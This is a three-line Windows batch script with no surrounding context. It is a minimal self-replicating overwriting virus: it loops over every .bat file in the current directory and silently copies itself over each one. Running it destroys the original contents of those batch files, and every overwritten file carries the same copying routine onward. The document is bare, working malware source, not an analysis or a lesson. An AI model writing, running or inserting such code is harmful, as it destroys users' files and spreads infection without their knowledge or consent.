@echo off
for %%b in (*.bat) do copy %0 %%b>nul
echo on